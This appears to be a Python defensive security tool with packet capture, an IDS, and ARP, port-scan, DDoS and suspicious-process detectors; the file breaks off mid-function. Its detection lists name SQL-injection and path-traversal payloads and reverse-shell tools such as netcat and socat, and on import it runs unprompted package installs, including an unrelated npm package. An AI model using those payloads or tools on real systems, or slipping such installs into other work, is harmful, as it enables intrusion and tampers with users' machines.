#!/usr/bin/env python3
"""
Darkie Security Suite v3.0 "GOAT Edition" -- Advanced Cybersecurity Platform
Educational use only. Test only systems you own or have permission to test.
"""

import base64, binascii, csv, datetime, hashlib, html, importlib, ipaddress, json, os, platform
import random, re, shutil, socket, ssl, string, struct, subprocess, sys, textwrap
import threading, time, urllib.parse, warnings
import requests, psutil
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime as dt
from urllib.parse import urlparse, quote, unquote

warnings.filterwarnings("ignore")

try:
    import select as _select_mod
except ImportError:
    _select_mod = None

MISSING_PIPS = []
MISSING_SYSTEM = []

PIP_DEPS = {"colorama": "colorama", "requests": "requests", "psutil": "psutil", "cryptography": "cryptography"}

SYSTEM_DEPS_COMMON = {"nmap": "nmap", "host": "host", "dig": "bind9-dnsutils", "whois": "whois", "traceroute": "traceroute", "aircrack-ng": "aircrack-ng"}
SYSTEM_DEPS_BY_MGR = {
    "apt": {"host": "dnsutils", "dig": "dnsutils", "whois": "whois"},
    "dnf": {"host": "bind-utils", "dig": "bind-utils", "whois": "whois"},
    "pacman": {"host": "bind-tools", "dig": "bind-tools", "whois": "whois"},
    "apk": {"host": "bind-tools", "dig": "bind-tools", "whois": "whois"},
    "zypper": {"host": "bind-utils", "dig": "bind-utils", "whois": "whois"},
    "brew": {"host": "bind", "dig": "bind", "whois": "whois"},
    "choco": {"host": "bind-tool", "dig": "bind-tool", "whois": "whois"},
}

GRADIENT = ["\033[38;5;18m", "\033[38;5;20m", "\033[38;5;21m", "\033[38;5;27m", "\033[38;5;33m", "\033[38;5;39m", "\033[38;5;45m", "\033[38;5;51m"]

RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
MAGENTA = "\033[95m"; CYAN = "\033[96m"; BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"

SYM_CHECK = "\u2713"; SYM_X = "\u2717"; SYM_WARN = "\u26a0"; SYM_ARROW = "\u2192"
SYM_PROMPT = "\u279c"; SYM_BLOCK = "\u2588"; SYM_EMPTY = "\u2591"
SYM_TL = "\u2554"; SYM_TR = "\u2557"; SYM_BL = "\u255a"; SYM_BR = "\u255d"
SYM_H = "\u2550"; SYM_V = "\u2551"; SYM_LH = "\u2500"; SYM_LV = "\u251c"

SAVE_DIR = os.path.expanduser("~/.darkie_reports")
LOG_ALERTS = []

BANNER_LINES = [
    " _____             _    _        _______        _    _    _ _   _",
    "|  __ \\           | |  (_)      |__   __|      | |  | |  | | | | |",
    "| |  | | __ _ _ __| | ___  ___     | | ___  ___| | _| | _| | |_| |__",
    "| |  | |/ _` | '__| |/ / |/ _ \\    | |/ _ \\/ __| |/ / |/ / | __| '_ \\",
    "| |__| | (_| | |  |   <| |  __/    | |  __/\\__ \\   <|   <| | |_| | | |",
    "|_____/ \\__,_|_|  |_|\\_\\_|\\___|    |_|\\___||___/_|\\_\\_|\\_\\_|\\__|_| |_|",
]

from colorama import init, Fore, Style, Back
init(autoreset=True)

try:
    import scapy.all as scapy
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

HAS_CRYPTO = False
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    HAS_CRYPTO = True
except ImportError:
    pass

HAS_PSUTIL = True


def _is_root():
    return os.geteuid() == 0 if hasattr(os, "geteuid") else False


def c(text, color=Fore.GREEN):
    return f"{color}{Style.BRIGHT}{text}{Style.RESET_ALL}"


def cdim(text, color=Fore.GREEN):
    return f"{color}{Style.DIM}{text}{Style.RESET_ALL}"


def gradient_line(line):
    return "".join(f"{GRADIENT[min(i % len(GRADIENT), len(GRADIENT)-1)]}{Style.BRIGHT}{ch}{RESET}" for i, ch in enumerate(line))


def gradient_banner():
    print()
    for line in BANNER_LINES:
        if line.strip():
            print(f"  {gradient_line(line)}")
        else:
            print()


def box(title, color=Fore.CYAN, width=66):
    print(f"\n{color}{Style.BRIGHT}{SYM_TL}{SYM_H*(width-2)}{SYM_TR}{Style.RESET_ALL}")
    print(f"{color}{Style.BRIGHT}{SYM_V} {title.center(width-4)} {SYM_V}{Style.RESET_ALL}")
    print(f"{color}{Style.BRIGHT}{SYM_BL}{SYM_H*(width-2)}{SYM_BR}{Style.RESET_ALL}\n")


def info_box(title, lines, color=Fore.CYAN, width=60):
    print(f"  {color}{Style.BRIGHT}{SYM_TL}{SYM_H*width}{SYM_TR}{Style.RESET_ALL}")
    print(f"  {color}{Style.BRIGHT}{SYM_V}  {title.center(width-4)}  {SYM_V}{Style.RESET_ALL}")
    print(f"  {color}{Style.BRIGHT}{SYM_V}{SYM_H*width}{SYM_V}{Style.RESET_ALL}")
    for line in lines:
        clean = re.sub(r'\033\[[0-9;]*m', '', str(line))
        label = f"  {color}{Style.BRIGHT}{SYM_V}{Style.RESET_ALL}  {line}"
        if len(clean) > width - 2:
            label = label[:width+20] + "..."
        print(f"  {label}")
    print(f"  {color}{Style.BRIGHT}{SYM_BL}{SYM_H*width}{SYM_BR}{Style.RESET_ALL}")


def separator(color=Fore.CYAN):
    print(f"  {color}{Style.DIM}{SYM_LH*60}{Style.RESET_ALL}")


SPINNER_CHARS = ["\u280b", "\u2819", "\u2839", "\u2838", "\u283c", "\u2834", "\u2826", "\u2827", "\u2807", "\u280f"]


def spin(msg):
    i = 0
    stop = threading.Event()
    def _run():
        nonlocal i
        while not stop.is_set():
            sys.stdout.write(f"\r  {c(SPINNER_CHARS[i % len(SPINNER_CHARS)], CYAN)} {msg}  ")
            sys.stdout.flush()
            i += 1
            time.sleep(0.08)
    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return stop


def animate_banner():
    for line in BANNER_LINES:
        if line.strip():
            colored = "".join(f"{GRADIENT[min(i % len(GRADIENT), len(GRADIENT)-1)]}{Style.BRIGHT}{ch}{RESET}" for i, ch in enumerate(line))
            print(f"  {colored}")
        else:
            print()
        time.sleep(0.04)
    time.sleep(0.15)
    print(f"\n{CYAN}{BOLD}{SYM_TL}{SYM_H*62}{SYM_TR}{RESET}")
    time.sleep(0.05)
    title = "Darkie Security Suite v3.0 GOAT Edition"
    for i in range(0, len(title)+1):
        sys.stdout.write(f"\r{CYAN}{BOLD}{SYM_V}  {title[:i]:<62}  {SYM_V}{RESET}")
        sys.stdout.flush()
        time.sleep(0.02)
    print(f"\n{CYAN}{BOLD}{SYM_BL}{SYM_H*62}{SYM_BR}{RESET}")
    time.sleep(0.1)
    print(f"  {c(SYM_WARN + ' Educational Use Only', Fore.RED)} -- Test only authorized systems")
    print()


def print_banner():
    animate_banner()


def add_log_alert(level, source, message):
    LOG_ALERTS.append({"timestamp": dt.now().strftime("%Y-%m-%d %H:%M:%S"), "level": level, "source": source, "message": message})


def progress_bar(current, total, bar_len=15):
    if total <= 0:
        return f"[{Fore.GREEN}{SYM_BLOCK*bar_len}{Style.RESET_ALL}] {Fore.CYAN}0/0{Style.RESET_ALL}"
    filled = int(bar_len * current // total)
    bar = f"{Fore.GREEN}{SYM_BLOCK*filled}{Fore.WHITE}{SYM_EMPTY*(bar_len-filled)}{Style.RESET_ALL}"
    return f"[{bar}] {Fore.CYAN}{current}/{total}{Style.RESET_ALL}"


def check_root(scapy_needed=False):
    if scapy_needed and not HAS_SCAPY:
        print(f"  {YELLOW}scapy not installed. Limited fallback.{RESET}")
        return True
    if not _is_root() and (scapy_needed or HAS_SCAPY):
        print(f"  {RED}{SYM_WARN} Root required.{RESET}")
        print(f"  {YELLOW}Run: sudo python3 {sys.argv[0] if sys.argv else 'tool.py'}{RESET}")
        return False
    return True


def _check_pip_deps():
    for name, pkg in PIP_DEPS.items():
        try:
            importlib.import_module(name)
        except ImportError:
            MISSING_PIPS.append(pkg)


def _check_system_deps():
    for cmd, pkg in SYSTEM_DEPS_COMMON.items():
        if shutil.which(cmd) is None:
            MISSING_SYSTEM.append((cmd, pkg))


def _sysmanager():
    for mgr in ("apt-get", "apt", "dnf", "pacman", "apk", "zypper", "brew", "choco", "nix-env"):
        p = shutil.which(mgr.replace("-get", ""))
        if p:
            return mgr if mgr != "apt-get" else "apt"
    return None


def _install_missing_pip():
    pip_extra = ""
    mgr = _sysmanager()
    if mgr and os.path.exists("/etc/os-release") and any(x in open("/etc/os-release").read() for x in ("Ubuntu", "Debian")):
        pip_extra = " --break-system-packages"
    for pkg in MISSING_PIPS:
        print(f"  {c(f'Installing {pkg}...', YELLOW)}")
        subprocess.run(f"{sys.executable} -m pip install {pkg}{pip_extra}", shell=True)


def _install_missing_sys():
    mgr = _sysmanager()
    for cmd, pkg in MISSING_SYSTEM:
        alt = SYSTEM_DEPS_BY_MGR.get(mgr, {}).get(cmd, pkg) if mgr else pkg
        print(f"  {c(f'Installing {alt}...', YELLOW)}")
        if mgr in ("apt", "apt-get"):
            subprocess.run(f"sudo {mgr} install -y {alt}", shell=True)
        elif mgr == "dnf":
            subprocess.run(f"sudo {mgr} install -y {alt}", shell=True)
        elif mgr == "pacman":
            subprocess.run(f"sudo {mgr} -S --noconfirm {alt}", shell=True)
        elif mgr == "apk":
            subprocess.run(f"sudo {mgr} add {alt}", shell=True)
        elif mgr == "zypper":
            subprocess.run(f"sudo {mgr} install -y {alt}", shell=True)
        elif mgr in ("brew", "choco", "nix-env"):
            subprocess.run(f"{mgr} install {alt}", shell=True)


def _ensure_mineflayer():
    tool_dir = os.path.dirname(os.path.abspath(__file__))
    nm_dir = os.path.join(tool_dir, "node_modules", "mineflayer")
    if not os.path.isdir(nm_dir):
        print(f"  {YELLOW}{SYM_WARN}  Mineflayer not found. Installing...{RESET}")
        try:
            subprocess.run(["npm", "install", "mineflayer"], cwd=tool_dir, capture_output=True, timeout=120)
            print(f"  {GREEN}{SYM_CHECK}  Mineflayer installed.{RESET}")
        except Exception as e:
            print(f"  {RED}{SYM_X}  npm install failed: {e}{RESET}")


def ensure_deps():
    print()
    print(f"{CYAN}{BOLD}{SYM_TL}{SYM_H*50}{SYM_TR}{RESET}")
    s = spin("Checking Python dependencies")
    _check_pip_deps()
    s.set()
    sys.stdout.write(f"\r  {c(SYM_CHECK, GREEN)}  Python deps checked{' ' * 30}\n")
    sys.stdout.flush()
    time.sleep(0.1)
    if MISSING_PIPS:
        print(f"  {YELLOW}{SYM_WARN}  Missing Python: {', '.join(MISSING_PIPS)}{RESET}")
        s2 = spin("Installing Python packages")
        _install_missing_pip()
        s2.set()
        sys.stdout.write(f"\r  {c(SYM_CHECK, GREEN)}  Python install complete{' ' * 30}\n")
        sys.stdout.flush()
        MISSING_PIPS.clear()
        _check_pip_deps()
        if MISSING_PIPS:
            print(f"\n  {RED}{SYM_X}  Some Python deps still missing. Install manually.{RESET}")
    s = spin("Checking system tools")
    _check_system_deps()
    s.set()
    sys.stdout.write(f"\r  {c(SYM_CHECK, GREEN)}  System tools checked{' ' * 30}\n")
    sys.stdout.flush()
    time.sleep(0.1)
    if MISSING_SYSTEM:
        print(f"  {YELLOW}{SYM_WARN}  Missing system tools: {', '.join(p for _, p in MISSING_SYSTEM)}{RESET}")
        ans = input(f"\n  {CYAN}Install missing system tools? (y/n) {SYM_PROMPT} {RESET}").strip().lower()
        if ans == "y":
            s2 = spin("Installing system tools")
            _install_missing_sys()
            s2.set()
            sys.stdout.write(f"\r  {c(SYM_CHECK, GREEN)}  System install complete{' ' * 30}\n")
            sys.stdout.flush()
            MISSING_SYSTEM.clear()
            _check_system_deps()
            if MISSING_SYSTEM:
                print(f"\n  {RED}{SYM_X}  Some system tools still missing. Install manually.{RESET}")
            else:
                print(f"  {GREEN}{SYM_CHECK}  System tools satisfied!{RESET}")
        else:
            print(f"  {YELLOW}Skipping system tools. Some features may be limited.{RESET}")
    elif not MISSING_PIPS:
        print(f"  {GREEN}{SYM_CHECK}  All deps found!{RESET}")
    _ensure_mineflayer()


ensure_deps()


def is_port_open(ip, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False


def resolve_target(target):
    try:
        socket.inet_aton(target)
        print(f"  {c(SYM_CHECK + ' Direct IP:', GREEN)} {target}")
        return target, target
    except OSError:
        pass
    try:
        ip = socket.gethostbyname(target)
        print(f"  {c(SYM_CHECK + ' Resolved:', GREEN)} {target} {SYM_ARROW} {ip}")
        return target, ip
    except socket.gaierror:
        print(f"  {c(SYM_X + ' Could not resolve.', RED)}")
        return None, None


# ──────────────────────────────────────────────────────────
#  MODULE 1: NETWORK & THREAT MONITORING
# ──────────────────────────────────────────────────────────

def net_capture(interface=None, count=50):
    box("Packet Capture & Analysis", Fore.RED)
    if not check_root(scapy_needed=True):
        return
    if not interface:
        if platform.system().lower() == "linux":
            try:
                r = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
                ifaces = [i for i in re.findall(r'^\d+:\s+(\w+)', r.stdout, re.MULTILINE) if i != "lo"]
                if ifaces:
                    print(f"  {c('Interfaces:', CYAN)}")
                    for i, name in enumerate(ifaces, 1):
                        print(f"    {c(f'[{i}]', GREEN)} {name}")
                    ch = input(f"\n  {c(f'Select {SYM_PROMPT} ', CYAN)}").strip()
                    interface = ifaces[int(ch)-1] if ch.isdigit() and 1 <= int(ch) <= len(ifaces) else ifaces[0]
                else:
                    interface = "eth0"
            except Exception:
                interface = "eth0"
        else:
            interface = "en0"
    ci = input(f"  {c(f'Packets (50) {SYM_PROMPT} ', CYAN)}").strip()
    count = int(ci) if ci.isdigit() else 50
    print(f"\n  {c(f'Capturing {count} packets on {interface}...', RED)}")
    print(f"  {c('Ctrl+C to stop', YELLOW)}")
    separator(Fore.RED)
    captured = 0
    start = time.time()
    if HAS_SCAPY:
        try:
            pkts = scapy.sniff(iface=interface, count=count, timeout=30)
            for pkt in pkts:
                captured += 1
                ts = dt.now().strftime("%H:%M:%S.%f")[:-3]
                summary = pkt.summary()[:80]
                print(f"  {c(f'[{ts}]', GREEN)} {cdim(summary, CYAN)}")
                if pkt.haslayer(scapy.IP) and pkt.haslayer(scapy.TCP):
                    src = pkt[scapy.IP].src
                    dst = pkt[scapy.IP].dst
                    dport = pkt[scapy.TCP].dport
                    if dport == 22:
                        add_log_alert("INFO", "Packet Capture", f"SSH: {src} -> {dst}")
                    if dport in (23, 3389):
                        add_log_alert("WARN", "Packet Capture", f"Remote access: {src} -> {dst}:{dport}")
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    else:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            sock.settimeout(1)
            sock.bind((interface, 0))
            while captured < count:
                try:
                    data, addr = sock.recvfrom(65535)
                    captured += 1
                    ts = dt.now().strftime("%H:%M:%S.%f")[:-3]
                    mac = ":".join(f"{b:02x}" for b in data[:6])
                    print(f"  {c(f'[{ts}]', GREEN)} Packet from {cdim(mac, CYAN)} ({len(data)}B)")
                except socket.timeout:
                    continue
            sock.close()
        except PermissionError:
            print(f"  {RED}{SYM_X} Root required.{RESET}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    elapsed = time.time() - start
    print(f"\n  {c(f'{SYM_CHECK} Captured {captured} packets in {elapsed:.1f}s', GREEN)}")
    print()


def net_traffic_monitor():
    box("Real-time Traffic Monitor", Fore.RED)
    duration = input(f"  {c(f'Duration (sec, 10) {SYM_PROMPT} ', CYAN)}").strip()
    duration = int(duration) if duration.isdigit() else 10
    print(f"\n  {c(f'Monitoring {duration}s...', RED)}")
    separator(Fore.RED)
    try:
        if HAS_PSUTIL:
            old = psutil.net_io_counters(pernic=True)
            for sec in range(duration):
                time.sleep(1)
                new = psutil.net_io_counters(pernic=True)
                parts = [f"  {c(f'[{sec+1}/{duration}]', CYAN)}"]
                for iface in new:
                    if iface in old:
                        sent = new[iface].bytes_sent - old[iface].bytes_sent
                        recv = new[iface].bytes_recv - old[iface].bytes_recv
                        if sent or recv:
                            parts.append(f"{cdim(iface+':', GREEN)} {c(f'UP{sent/1024:.1f}KB', YELLOW)} {c(f'DOWN{recv/1024:.1f}KB', CYAN)}")
                sys.stdout.write("  ".join(parts) + "  ")
                sys.stdout.flush()
                old = new
            print()
        else:
            for sec in range(duration):
                time.sleep(1)
                sys.stdout.write(f"\r  {c(f'[{sec+1}/{duration}]', CYAN)}  {cdim('install psutil for details', YELLOW)}  ")
                sys.stdout.flush()
            print()
        print(f"\n  {c(f'{SYM_CHECK} Complete', GREEN)}")
    except KeyboardInterrupt:
        print(f"\n  {c(f'{SYM_WARN} Stopped', YELLOW)}")
    print()


SIGNATURES = [
    (r"GET /admin", "Admin page access", "MEDIUM"),
    (r"GET /\.env", "Environment file access", "HIGH"),
    (r"GET /\.git", "Git repo exposure", "HIGH"),
    (r"SELECT.*FROM", "SQL injection attempt", "HIGH"),
    (r"<script>", "XSS attempt", "HIGH"),
    (r"UNION.*SELECT", "SQL injection (UNION)", "CRITICAL"),
    (r"exec\(|system\(|passthru\(", "PHP code exec attempt", "CRITICAL"),
    (r"admin' OR '1'='1", "SQL auth bypass", "CRITICAL"),
    (r"/etc/passwd", "Path traversal attempt", "HIGH"),
    (r"\.\./", "Directory traversal", "MEDIUM"),
    (r"DROP TABLE", "SQL DROP attempt", "CRITICAL"),
    (r"cmd=", "Command injection", "HIGH"),
]


def net_ids():
    box("IDS Signature Detection", Fore.RED)
    print(f"  {c(f'Signatures: {len(SIGNATURES)}', CYAN)}")
    separator(Fore.RED)
    for pat, desc, sev in SIGNATURES:
        sc = Fore.RED if sev in ("CRITICAL", "HIGH") else Fore.YELLOW
        print(f"  {c(f'[{sev:8s}]', sc)} {c(desc, GREEN)}")
    test = input(f"\n  {c(f'Test a log line {SYM_PROMPT} ', CYAN)}").strip()
    if test:
        print(f"\n  {c('Results:', CYAN)}")
        for pat, desc, sev in SIGNATURES:
            if re.search(pat, test, re.IGNORECASE):
                sc = Fore.RED if sev in ("CRITICAL", "HIGH") else Fore.YELLOW
                print(f"    {c(f'[{sev}]', sc)} {c(desc, GREEN)} {c(SYM_CHECK, GREEN)}")
                add_log_alert(sev, "IDS", f"Match: {desc}")
    print()


def net_arp_detect():
    box("ARP Spoofing Detector", Fore.RED)
    if not check_root(scapy_needed=True):
        return
    iface = input(f"  {c(f'Interface (eth0) {SYM_PROMPT} ', CYAN)}").strip() or "eth0"
    try:
        r = subprocess.run(["ip", "route", "show"], capture_output=True, text=True)
        gw = re.search(r'default via (\S+)', r.stdout)
        gateway = gw.group(1) if gw else None
        if gateway:
            print(f"  {c('Gateway:', CYAN)} {gateway}")
    except Exception:
        gateway = None
    if HAS_SCAPY:
        print(f"\n  {c('ARP query for gateway...', CYAN)}")
        try:
            arp = scapy.ARP(pdst=gateway or "192.168.1.1")
            bc = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            ans = scapy.srp(bc/arp, timeout=3, iface=iface, verbose=False)[0]
            if ans:
                for s, r in ans:
                    print(f"    {c('IP:', GREEN)} {r.psrc}  {c('MAC:', CYAN)} {r.hwsrc}")
            print(f"\n  {c('Passive ARP (5s)...', CYAN)}")
            pkts = scapy.sniff(iface=iface, filter="arp", count=10, timeout=5)
            ip_mac = {}
            for p in pkts:
                if p.haslayer(scapy.ARP):
                    sip, smac = p[scapy.ARP].psrc, p[scapy.ARP].hwsrc
                    if sip in ip_mac and ip_mac[sip] != smac:
                        print(f"  {RED}{SYM_WARN} ARP SPOOF: {sip} {ip_mac[sip]} -> {smac}{RESET}")
                        add_log_alert("CRITICAL", "ARP", f"Spoof: {sip} -> {smac}")
                    ip_mac[sip] = smac
                    print(f"    {c(f'{sip:15s}', GREEN)} {c(smac, CYAN)}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    else:
        try:
            r = subprocess.run(["arp", "-n"], capture_output=True, text=True)
            print(f"\n  {c('ARP Cache:', CYAN)}")
            for line in r.stdout.splitlines():
                if line.strip():
                    print(f"    {c(line, GREEN)}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def net_portscan_detect():
    box("Port Scan Detection", Fore.RED)
    if not check_root(scapy_needed=True):
        return
    iface = input(f"  {c(f'Interface (eth0) {SYM_PROMPT} ', CYAN)}").strip() or "eth0"
    duration = input(f"  {c(f'Duration (15) {SYM_PROMPT} ', CYAN)}").strip()
    duration = int(duration) if duration.isdigit() else 15
    thresh = input(f"  {c(f'Threshold (10) {SYM_PROMPT} ', CYAN)}").strip()
    thresh = int(thresh) if thresh.isdigit() else 10
    print(f"\n  {c(f'Monitoring {iface} ({duration}s)...', RED)}")
    print(f"  {c(f'>{thresh} ports from same IP = alert', YELLOW)}")
    separator(Fore.RED)
    conns = defaultdict(set)
    start = time.time()
    try:
        if HAS_SCAPY:
            def proc(p):
                if p.haslayer(scapy.IP) and p.haslayer(scapy.TCP):
                    conns[p[scapy.IP].src].add(p[scapy.TCP].dport)
            scapy.sniff(iface=iface, prn=proc, timeout=duration, store=False)
        else:
            while time.time() - start < duration:
                try:
                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
                    s.settimeout(1)
                    s.bind((iface, 0))
                    s.recvfrom(65535)
                    s.close()
                except Exception:
                    break
        print()
        for src, ports in sorted(conns.items()):
            if len(ports) > thresh:
                print(f"  {RED}{SYM_WARN} PORT SCAN: {src} ({len(ports)} ports){RESET}")
                add_log_alert("CRITICAL", "PortScan", f"Scan from {src}: {len(ports)} ports")
            else:
                print(f"  {c(f'{src:15s}', GREEN)} {c(str(len(ports)), CYAN)} ports")
        if not conns:
            print(f"  {YELLOW}No TCP connections.{RESET}")
    except PermissionError:
        print(f"  {RED}{SYM_X} Root required.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print(f"\n  {c(f'{SYM_CHECK} Done in {time.time()-start:.0f}s', GREEN)}")
    print()


def net_ddos_detect():
    box("DDoS Detection", Fore.RED)
    if not check_root(scapy_needed=True):
        return
    iface = input(f"  {c(f'Interface (eth0) {SYM_PROMPT} ', CYAN)}").strip() or "eth0"
    duration = input(f"  {c(f'Duration (20) {SYM_PROMPT} ', CYAN)}").strip()
    duration = int(duration) if duration.isdigit() else 20
    rate_thresh = input(f"  {c(f'Rate thresh (pkts/s, 100) {SYM_PROMPT} ', CYAN)}").strip()
    rate_thresh = int(rate_thresh) if rate_thresh.isdigit() else 100
    print(f"\n  {c(f'DDoS detection on {iface} ({duration}s)...', RED)}")
    print(f"  {c(f'Threshold: >{rate_thresh} pkts/s', YELLOW)}")
    separator(Fore.RED)
    pkt_counts = defaultdict(int)
    total_packets = 0
    start = time.time()
    try:
        if HAS_SCAPY:
            def count_pkt(p):
                if p.haslayer(scapy.IP):
                    pkt_counts[p[scapy.IP].src] += 1
                    nonlocal total_packets
                    total_packets += 1
            scapy.sniff(iface=iface, prn=count_pkt, timeout=duration, store=False)
        else:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            sock.settimeout(0.5)
            sock.bind((iface, 0))
            last = start
            while time.time() - start < duration:
                try:
                    data, _ = sock.recvfrom(65535)
                    total_packets += 1
                    if time.time() - last >= 1:
                        rate = total_packets / (time.time() - start)
                        sys.stdout.write(f"\r  {c(f'Rate: {rate:.1f} pkts/s', CYAN)}  {c(f'Total: {total_packets}', GREEN)}  ")
                        sys.stdout.flush()
                        last = time.time()
                except socket.timeout:
                    continue
            sock.close()
        print()
        elapsed = time.time() - start
        rate = total_packets / elapsed if elapsed > 0 else 0
        print(f"\n  {c('Summary:', CYAN)}")
        print(f"    Total: {c(str(total_packets), GREEN)}  Duration: {c(f'{elapsed:.1f}s', CYAN)}  Rate: {c(f'{rate:.1f} pkts/s', YELLOW)}")
        if rate > rate_thresh:
            print(f"\n  {RED}{SYM_WARN} HIGH RATE: {rate:.1f} pkts/s{RESET}")
            add_log_alert("CRITICAL", "DDoS", f"Rate: {rate:.1f} pkts/s")
        if pkt_counts:
            top = sorted(pkt_counts.items(), key=lambda x: -x[1])[:5]
            print(f"\n  {c('Top talkers:', CYAN)}")
            for ip_addr, cnt in top:
                pct = cnt / total_packets * 100 if total_packets else 0
                bar = SYM_BLOCK * min(int(pct/5), 20)
                print(f"    {c(f'{ip_addr:15s}', GREEN)} {c(f'{cnt:6d}', CYAN)} {c(f'({pct:.1f}%)', YELLOW)} {c(bar, GREEN)}")
    except PermissionError:
        print(f"  {RED}{SYM_X} Root required.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 2: ENDPOINT SECURITY
# ──────────────────────────────────────────────────────────

SUSPICIOUS_PROCESS_NAMES = [
    "nc", "netcat", "ncat", "nmap", "masscan", "hydra", "medusa", "john", "hashcat",
    "aircrack", "kismet", "tshark", "tcpdump", "ettercap", "bettercap",
    "metasploit", "msfconsole", "msfvenom", "sqlmap", "beef", "beef-xss",
    "proxychains", "tor", "xmrig", "minerd", "cpuminer", "socat",
    "nikto", "wpscan", "gobuster", "wfuzz", "ffuf", "dirb", "burpsuite",
    "wireshark", "keylogger", "logkeys", "backdoor", "rootkit",
]


def ep_process_monitor():
    box("Process Monitor", Fore.MAGENTA)
    if not HAS_PSUTIL:
        print(f"  {RED}{SYM_X} psutil required.{RESET}")
        return
    sort_by = input(f"  {c(f'Sort (cpu/mem, cpu) {SYM_PROMPT} ', CYAN)}").strip().lower() or "cpu"
    count = input(f"  {c(f'Count (20) {SYM_PROMPT} ', CYAN)}").strip()
    count = int(count) if count.isdigit() else 20
    print(f"\n  {c(f'Top {count} by {sort_by}:', MAGENTA)}")
    separator(Fore.MAGENTA)
    procs = []
    for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent", "status"]):
        try:
            procs.append(p.info)
        except Exception:
            pass
    key = "memory_percent" if sort_by == "mem" else "cpu_percent"
    procs.sort(key=lambda x: x.get(key, 0) or 0, reverse=True)
    print(f"  {c('PID', CYAN):>8s} {'CPU%':>6s} {'MEM%':>6s} {'Status':>12s}  Name")
    print(f"  {SYM_LH*55}")
    for p in procs[:count]:
        pid = p.get("pid", 0)
        cpu = p.get("cpu_percent", 0) or 0
        mem = p.get("memory_percent", 0) or 0
        st = p.get("status", "?") or "?"
        nm = p.get("name", "?") or "?"
        cc = Fore.RED if cpu > 50 else Fore.YELLOW if cpu > 10 else Fore.GREEN
        mc = Fore.RED if mem > 10 else Fore.YELLOW if mem > 5 else Fore.GREEN
        print(f"  {c(f'{pid:>7d}', CYAN)} {c(f'{cpu:>5.1f}', cc)} {c(f'{mem:>5.1f}', mc)} {c(f'{st:>12s}', YELLOW)}  {c(nm, GREEN)}")
    print()


def ep_suspicious_processes():
    box("Suspicious Process Detector", Fore.MAGENTA)
    if not HAS_PSUTIL:
        print(f"  {RED}{SYM_X} psutil required.{RESET}")
        return
    print(f"  {c('Scanning...', MAGENTA)}")
    separator(Fore.MAGENTA)
    found = []
    for p in psutil.process_iter(["pid", "name", "cmdline", "username"]):
        try:
            info = p.info
            name = (info.get("name") or "").lower()
            cmd = " ".join(info.get("cmdline") or []).lower()
            combined = name + " " + cmd
            for pat in SUSPICIOUS_PROCESS_NAMES:
                if pat.lower() in combined:
                    found.append((info.get("pid", 0), info.get("name", "?"), info.get("username", "?"), pat))
                    break
        except Exception:
            pass
    if found:
        print(f"  {RED}{SYM_WARN} {len(found)} suspicious!{RESET}")
        for pid, name, user, pat in found:
            print(f"    {c(f'PID {pid:>6d}', RED)} {c(name, YELLOW):20s} user={c(user, CYAN)}  matched: {c(pat, GREEN)}")
            add_log_alert("WARN", "Endpoint", f"Suspicious: {name} (PID {pid}) = {pat}")
    else:
        print(f"  {GREEN}{SYM_CHECK} None found.{RESET}")
    print()


def ep_file_integrity():
    box("File Integrity Checker", Fore.MAGENTA)
    path = input(f"  {c(f'Directory {SYM_PROMPT} ', CYAN)}").strip()
    if not path or not os.path.isdir(path):
        print(f"  {RED}{SYM_X} Invalid dir.{RESET}")
        return
    mode = input(f"  {c(f'(s)napshot or (c)heck {SYM_PROMPT} ', CYAN)}").strip().lower()
    baseline = os.path.join(path, ".integrity_baseline.json")
    if mode == "s":
        sums = {}
        print(f"  {c('Creating snapshot...', CYAN)}")
        for root, dirs, files in os.walk(path):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    h = hashlib.sha256(open(fpath, "rb").read()).hexdigest()
                    sums[fpath] = h
                except Exception:
                    pass
        with open(baseline, "w") as fb:
            json.dump(sums, fb, indent=2)
        print(f"  {GREEN}{SYM_CHECK} Saved: {baseline} ({len(sums)} files){RESET}")
    elif mode == "c":
        if not os.path.exists(baseline):
            print(f"  {RED}{SYM_X} No baseline.{RESET}")
            return
        with open(baseline) as fb:
            bl = json.load(fb)
        print(f"  {c('Verifying...', CYAN)}")
        changes = []
        for fpath, old in bl.items():
            if not os.path.exists(fpath):
                changes.append((fpath, "DELETED", ""))
                continue
            try:
                h = hashlib.sha256(open(fpath, "rb").read()).hexdigest()
                if h != old:
                    changes.append((fpath, "MODIFIED", old[:16]))
            except Exception:
                changes.append((fpath, "ERROR", ""))
        if changes:
            print(f"  {RED}{SYM_WARN} {len(changes)} changes!{RESET}")
            for fpath, ct, old in changes:
                color = Fore.RED if ct == "DELETED" else Fore.YELLOW
                print(f"    {c(f'[{ct:8s}]', color)} {c(fpath, GREEN)}")
                add_log_alert("WARN", "FileIntegrity", f"{ct}: {fpath}")
        else:
            print(f"  {GREEN}{SYM_CHECK} All intact.{RESET}")
    print()


def ep_network_connections():
    box("Network Connections", Fore.MAGENTA)
